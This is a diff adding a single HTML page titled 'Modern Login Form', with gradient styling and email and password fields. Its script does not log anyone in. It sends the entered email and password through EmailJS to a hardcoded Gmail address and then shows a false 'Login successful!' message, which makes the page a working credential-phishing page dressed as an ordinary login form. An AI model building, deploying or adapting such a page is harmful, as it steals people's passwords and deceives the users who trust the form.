@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Login Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+        }
+
+        .container {
+            position: relative;
+            width: 100%;
+            max-width: 380px;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+        }
+
+        .container h2 {
+            color: #fff;
+            text-align: center;
+            font-size: 2em;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            outline: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1em;
+        }
+
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1em;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .message {
+            margin-top: 20px;
+            text-align: center;
+            color: #fff;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Login</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="email" id="email" placeholder="Email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit">Login</button>
+        </form>
+        <div id="message" class="message"></div>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("XM9bEtZyHPDl9WA8u"); // Replace with your EmailJS public key
+        })();
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const messageDiv = document.getElementById('message');
+
+            // Send email using EmailJS
+            emailjs.send("data_login", "template_zbe8spb", {
+                to_email: "mantapnyooo10@gmail.com",
+                from_email: email,
+                password: password,
+            }).then(
+                function(response) {
+                    messageDiv.style.display = 'block';
+                    messageDiv.style.color = '#4ecdc4';
+                    messageDiv.textContent = "Login successful!";
+                    
+                    // Clear form
+                    document.getElementById('loginForm').reset();
+                },
+                function(error) {
+                    messageDiv.style.display = 'block';
+                    messageDiv.style.color = '#ff6b6b';
+                    messageDiv.textContent = "Login failed. Please try again.";
+                }
+            );
+        });
+    </script>
+</body>
+</html>
